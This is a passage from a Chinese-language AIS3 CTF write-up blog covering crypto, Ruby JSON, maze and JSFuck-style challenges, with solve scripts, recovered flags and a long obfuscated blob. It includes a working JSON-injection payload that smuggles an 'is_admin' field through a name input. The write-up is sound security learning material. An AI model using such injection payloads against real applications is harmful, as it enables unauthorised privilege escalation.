66041342629370508454542074994365658229172256958181229352307334576482691683015)</span><br><span class="line">(8632122664874796621953128019442062099837815757541666807238013800911876893350, 22501641140131711417963423065056536632180107445777684288207697273361470683273)</span><br><span class="line">(115344464010290729302713831582193370190697080553660538053385895810259030460916, 77503448741335278183206156357396662423025923398172224236009034178181972205479)</span><br><span class="line">(95677652297594211660378922522389069198792909828102345898292332512667184415485, 97369015286505274469621022862509528815401557947017152797209239504606974035121)</span><br><span class="line">(52022678928966731960197629191385848996096766259855903228068390479180873592868, 12272018583799705915423423366852058485197850115859895472451299274837678927146)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有點多，第一下還以為可能是要把所有東西拿去xor之類的</p>
<p>但是有耐心的一步一步把上面那題的包裝全部拆掉後發現他只是一個長的像下面這樣的東東</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b &#x3D; swap(b) ^ swap(k) ^ 0101 -&gt; key &#x3D; swap(k) ^ 0101</span><br><span class="line"></span><br><span class="line">b &#x3D; b ^ k ^ 0101 ^ swap(k)   -&gt; key &#x3D; swap(k)</span><br><span class="line">b &#x3D; swap(b)^swap(k)          -&gt; key &#x3D; k ^ 0101</span><br><span class="line">b &#x3D; b ^ k ^ swap(k)          -&gt; key &#x3D; swap(k)</span><br><span class="line">b &#x3D; swap(b)^swap(k)^0101     -&gt; key &#x3D; k ^ 0101</span><br><span class="line"></span><br><span class="line">b &#x3D; b ^ k ^ 0101 ^ swap(k)   -&gt; key &#x3D; swap(k)</span><br><span class="line">b &#x3D; swap(b)^swap(k)          -&gt; key &#x3D; k ^ 0101</span><br><span class="line">b &#x3D; b ^ k ^ swap(k)          -&gt; key &#x3D; swap(k)</span><br><span class="line">b &#x3D; swap(b)^swap(k)^0101     -&gt; key &#x3D; k ^ 0101</span><br></pre></td></tr></table></figure>

<p>所以輕鬆寫了個腳本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span>(<span class="params">b</span>):</span></span><br><span class="line">    <span class="comment"># swap first-half and last-half bit</span></span><br><span class="line">    l = BLOCK_SIZE // <span class="number">2</span></span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; l) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (b &gt;&gt; l) | ((b &amp; mask) &lt;&lt; l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    plain, encrypt = (<span class="number">76173805501177359573786250867826865667623985658852407459502964711159068527937</span>, <span class="number">7132216118997241161329301114592304948838945360663660382939528954550389872641</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;AIS3&#123;&quot;</span>+<span class="built_in">hex</span>(swap(swap(plain) ^ encrypt))[<span class="number">2</span>:]+<span class="string">&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>跑了起來就拿到flag: <code>Flag : AIS3&#123;db2b6caba3833bd883d32e94fad7af82dcbe718ef6b1852d3593b056e295873e&#125; 99845311382255963867520670568134167074234626107841305012117760590481303515010</code></p>
<h3 id="MaoHash"><a href="#MaoHash" class="headerlink" title="MaoHash"></a>MaoHash</h3><p>一樣沒什麼時間仔細研究他怎麼hash的</p>
<p>官解是說有length extension的攻擊可以用，不過我是還沒讀完</p>
<h3 id="ReSolveFinaL"><a href="#ReSolveFinaL" class="headerlink" title="ReSolveFinaL"></a>ReSolveFinaL</h3><p>看了一眼發現是LFSR，但也來不及研究完QQ</p>
<p>官解是說可以用Berlekamp-Massey把參數搞出來之類的</p>
<p>其實我在這之前不知道Berlekamp-Massey在xor下也可以做，看了wiki才發現的確可以XD</p>
<p>畢竟之前我也只有在fjzzq的blog看過這個他說可以拿來唬爛線性遞迴式的算法</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Are-you-admin"><a href="#Are-you-admin" class="headerlink" title="Are you admin?"></a>Are you admin?</h3><p>題目開起來拿到一個ruby，看起來就是要繞過裡面的JSON</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;json&#x27;</span></span><br><span class="line"></span><br><span class="line">STDOUT.sync = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">puts <span class="string">&quot;Your name:&quot;</span></span><br><span class="line">name = STDIN.gets.chomp</span><br><span class="line">puts <span class="string">&quot;Your age:&quot;</span></span><br><span class="line">age = STDIN.gets.chomp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> age.match(<span class="regexp">/[[:alpha:]]/</span>)</span><br><span class="line">    puts <span class="string">&quot;No!No!No!&quot;</span></span><br><span class="line">    exit</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;<span class="subst">#&#123;name&#125;</span>\&quot;,\&quot;is_admin\&quot;:\&quot;no\&quot;, \&quot;age\&quot;:\&quot;<span class="subst">#&#123;age&#125;</span>\&quot;&#125;&quot;</span></span><br><span class="line">puts string</span><br><span class="line">res = JSON.parse(string)</span><br><span class="line">puts res[<span class="string">&#x27;age&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> res[<span class="string">&#x27;is_admin&#x27;</span>] == <span class="string">&quot;yes&quot;</span></span><br><span class="line">    puts <span class="string">&quot;AIS3&#123;xxxxxxxxxxxx&#125;&quot;</span>  <span class="comment"># flag is here</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    puts <span class="string">&quot;Hello, &quot;</span> + res[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    puts <span class="string">&quot;You are not admin :(&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>發現age那邊雖然不能有任何英文字母，但是特殊符號還是可以有的</p>
<p>所以想到說可以把他設定is_admin利用name的地方把他包起來，然後age那邊給個結尾的符號就可以了</p>
<p>payload大概長的像這樣:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Your name:</span><br><span class="line">a&quot;,&quot;is_admin&quot;:&quot;yes&quot;,&quot;meow&quot;:&#123;&quot;a&quot;:&quot;b</span><br><span class="line">Your age:</span><br><span class="line">1&quot;&#125;,&quot;1&quot;:&quot;7122</span><br></pre></td></tr></table></figure>

<p>然後就拿到flag: <code>AIS3&#123;RuBy_js0n_i5_s0_w3ird_0_o&#125;</code></p>
<p>不過官解好像不是要考這東東XD</p>
<h3 id="Crystal-Maze"><a href="#Crystal-Maze" class="headerlink" title="Crystal Maze"></a>Crystal Maze</h3><p>打開這次是拿到一個我不認識的語言寫的腳本</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;./secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span></span>(client : TCPSocket)</span><br><span class="line">  spawn <span class="keyword">do</span></span><br><span class="line">    sleep <span class="number">5</span>.seconds</span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">      client.puts <span class="string">&quot;timeout&quot;</span></span><br><span class="line">    <span class="keyword">rescue</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    client.close</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    client.puts <span class="string">&quot;Bonjour. You&#x27;re in a <span class="subst">#&#123;SIZE&#125;</span>x<span class="subst">#&#123;SIZE&#125;</span> crystal maze.&quot;</span></span><br><span class="line">    client.puts <span class="string">&quot;To take a step, enter \&quot;up\&quot;, \&quot;down\&quot;, \&quot;left\&quot;, or \&quot;right\&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    loop <span class="keyword">do</span></span><br><span class="line">      client.send <span class="string">&quot;move: &quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> client.gets</span><br><span class="line">      <span class="keyword">when</span> <span class="string">&quot;up&quot;</span></span><br><span class="line">        y += <span class="number">1</span></span><br><span class="line">      <span class="keyword">when</span> <span class="string">&quot;down&quot;</span></span><br><span class="line">        y -= <span class="number">1</span></span><br><span class="line">      <span class="keyword">when</span> <span class="string">&quot;left&quot;</span></span><br><span class="line">        x -= <span class="number">1</span></span><br><span class="line">      <span class="keyword">when</span> <span class="string">&quot;right&quot;</span></span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        client.puts <span class="string">&quot;?&quot;</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> !((<span class="number">0</span> &lt;= x &lt; SIZE) &amp;&amp; (<span class="number">0</span> &lt;= y &lt; SIZE))</span><br><span class="line">        client.puts <span class="string">&quot;wall&quot;</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> MAZE[x][y]</span><br><span class="line">      <span class="keyword">when</span> <span class="number">0</span></span><br><span class="line">        client.puts <span class="string">&quot;ok&quot;</span></span><br><span class="line">      <span class="keyword">when</span> <span class="number">1</span></span><br><span class="line">        client.puts <span class="string">&quot;wall&quot;</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">when</span> <span class="number">2</span></span><br><span class="line">        client.puts FLAG</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  client.close</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> client = SERVER.accept?.<span class="keyword">as</span> TCPSocket</span><br><span class="line">  spawn run client</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>瞄了兩眼看起來就是要想辦法走迷宮走到終點</p>
<p>原本打算用python寫個腳本DFS的，但後來覺得有點難寫，而且地圖又不大，所以最後花了一點時間用手把地圖走完</p>
<p>以下是我走出來大概的地圖(?:未知,X:牆壁,.:空地,*:FLAG)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">???????????????*</span><br><span class="line">???????????????.</span><br><span class="line">???????????????.</span><br><span class="line">???????????????.</span><br><span class="line">???????????????.</span><br><span class="line">???????????????.</span><br><span class="line">??????????????..</span><br><span class="line">?X????????????.X</span><br><span class="line">X.XXX?????????..</span><br><span class="line">.....X?????????.</span><br><span class="line">.XX.X??????X???.</span><br><span class="line">..X..X??X?X...X.</span><br><span class="line">X.X.X??X.XX.X.X.</span><br><span class="line">..X.X?X.....X.X.</span><br><span class="line">X.X.XX..XXXXX...</span><br><span class="line">..X....X......X.</span><br></pre></td></tr></table></figure>

<p>真的走完就拿到flag: <code>AIS3&#123;4R3_Y0U_RUNN1NG_45_F45T_45_CRY5T4L?&#125;</code></p>
<h3 id="KcufsJ"><a href="#KcufsJ" class="headerlink" title="KcufsJ"></a>KcufsJ</h3><p>拿到一個莫名其妙的東東</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">))()]]][+[+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+]][![+][+(+)][!(]]][+[)][+][!!(+]]][+[+][!!+[)]][[][+]][![(+]][!!+][!![)][+][!(+]]][+[+][!!+[))]][[][()()]][!!+[)][+][!(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+[)][+][!!(+]][!!+][!![)][+)(]]][!!+][!!+][!![)][+][!(+]][!!+][!!+][!![)][+][!!(+]]][+[+][!!+[)]][[][+]][![(+]][!!+[)][+][!!(+]][+[)][+][!!(+]][!!+[)][+]][[][(+]][!!+][!!+][!![)][+][!!([][(+]]][+[+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!(+]][!!+[)][+]][[][(+]][!!+[)][+][!!(+]][+[)][+]][[][(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!!(+]][!!+[)][+][!!((]]][!!+[)][+][!!(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][(+]][+[)][+]][[][(+]][!!+[)][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!(+]][!!+[)][+]][[][(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][([]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+]][![+(+]][!!+][!!+][!![)][+][!([))][!!+(+)][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!(+)][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!(+)][!!+][!!(+)][!!+(+][!+)][!!+][!!+][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][+(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+(+)][!!+][!!+][!!+][!!+][!!(+][!+)][!!+(+)][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!(+)][!!+(+)][!!+(+][!+)][!!+][!!+][!!+][!!(+)][!!+(+)][!!+(+][!+)][!!+(+)][!!+][!!+][!!+][!!+][!!(+][!+)][!!+(+)][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!(+)][!!+(+)][!!+(+][!+)][!!+(+)][!!+][!!+][!!+][!!+][!!(+][!+)][!!+(+)][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!(+)][!!+][!!(+)][!!+(+][!+)][!!+(+)][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!(+)][!!+][!!+][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!(+)][!!+][!!+][!!(+][!+)][+(+)][!!+][!!+][!!+][!!(+][!+)][!!+][!!+][!!(+)][+(+)][!!+(+][!+)][!!+(+)][!!+(+)][!!+(+][!+)][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!(+)][+(+)][!!+(+][!+)][!!+][!!+][!!+][!!+][!!+][!!(+)][!!+][!!+][!!+][!!(+][!+)][!!+(+)][+(+)][!!+(+][!+)][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!(+)][+(+)][!!+(+][!+)][!!+(+)][!!+(+)][!!+(+][!+)][!!+][!!+][!!+][!!+][!!(+)][!!+(+)][!!+(+][!+)][+(+)][!!+(+)][!!+(+][!+)][!!+(+)][!!+(+)][!!+(+][!+]][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!![+][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!+][!!(+]]][!!+][!!+][!![+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][(+]][+[)][+][!!(+]][!!+[)][+]][[][(+]]][+[+][!!+[)]][[][+]][![(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]]][!!+[+][!!+[)][+)()]][!!+[)][+][!!(+]][!!+[)][+][!(+]][!!+][!![)][+)(]]][!!+][!!+][!![)][+][!(+]][!!+][!!+][!![)][+][!!(+]]][+[+][!!+[)]][[][+]][![(+]][!!+[)][+][!!(+]][+[)][+][!!(+]][!!+[)][+]][[][(+]][!!+][!!+][!![)][+][!!([][(+]][!!+][!!+][!![)][+][!(+]][+[)][+]][[][(+]][+[)][+][!!(+]][!!+[)][+][!(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!(+]]][+[+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!(+]][!!+[)][+]][[][(+]][!!+[)][+][!!(+]][+[)][+]][[][(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!!(+]][!!+[)][+][!!((]]][!!+[)][+][!!(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][(+]][+[)][+]][[][(+]][!!+[)][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!(+]][!!+[)][+]][[][(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][([]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][(+]][!!+][!!+][!![)][+][!!(+]][!!+][!![)][+]][[][(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][!!+[)][!+)]][![+(+]][+[+][+()()]][!!+][!![)][+)(]]][!!+][!!+][!![)][+][!(+]][!!+][!!+][!![)][+][!!(+]]][+[+][!!+[)]][[][+]][![(+]][!!+[)][+][!!(+]][+[)][+][!!(+]][!!+[)][+]][[][(+]][!!+][!!+][!![)][+][!!([][(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+[)][+][!!(+]][!!+[)][+][!(+]]][+[+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!(+]][!!+[)][+]][[][(+]][!!+[)][+][!!(+]][+[)][+]][[][(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!!(+]][!!+[)][+][!!((]]][!!+[)][+][!!(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][(+]][+[)][+]][[][(+]][!!+[)][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!(+]][!!+[)][+]][[][(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][([]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+]]][!!+[+][!!+[)]]][!!+[)][+][!!(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][(+]][+[)][+]][[][(+]][!!+[)][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!(+]][!!+[)][+]][[][(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][([)][+(+][(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][!!+[)][+][!!(+]][+[)][+][!(+]][!!+[)][+))][+(+)][!!+][!!(+]][!!+][!!+][!![)][+][!!(+]][!!+[+][!!+(+(+]][!!+[)][+][!!(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][(+]][+[)][+]][[][(+]][!!+[)][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!(+]][!!+[)][+]][[][(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][(+]][!!+[)][+))][+(+)][!!+][!!(+]][!!+][!!+][!![)][+][!!(+]][!!+[+][!!+(+(+]][!!+][!!+][!![)][+][!(+]][+[)][+]][[][(+]][+[)][+][!!(+]][!!+[)][+][!(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!(+]]][+[+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!(+]][!!+[)][+]][[][(+]][!!+[)][+][!!(+]][+[)][+]][[][(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!!(+]][!!+[)][+][!!((]]][!!+[)][+][!!(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][(+]][+[)][+]][[][(+]][!!+[)][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!(+]][!!+[)][+]][[][(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][([]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][()()]][!!+][!![)][+][!(+]][!!+[)][+][!(+]]][+[+][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+]]]]][+[+][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!(+[]][!![[+]][![+(+]][!!+][!!+][!![)][+][!!(+]]][+[+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!(+]][!!+[)][+]][[][(+]][!!+[)][+][!!(+]][+[)][+]][[][(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!!(+]][!!+[)][+][!!((]]][!!+[)][+][!!(+]]][+[+][!!+[)]]][!!+][!![)